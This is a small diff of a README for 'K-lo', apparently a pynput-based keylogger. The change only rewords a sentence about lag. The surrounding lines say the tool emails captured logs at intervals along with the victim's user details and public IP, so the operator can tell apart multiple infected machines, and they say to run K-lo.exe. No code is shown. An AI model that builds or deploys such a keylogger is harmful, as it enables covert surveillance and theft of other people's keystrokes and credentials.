@@ -7,8 +7,8 @@ K-lo can also send these files to some email, these are sent
 every minutes that you indicated, with information
 of the PC-user who has K-lo running and his public IP. So you can
 identify them if you have installed on more than one machine (wink).
-K-lo uses the pynput librarie so it has not been reported so far
-LAG during its execution, unlike the pyhook. 
+K-lo uses the pynput librarie and it has not been reported LAG so far
+during its execution, unlike the pyhook. 
 
 ##FIRST STEP##
 Run the K-lo.exe file and enter the minutes you want
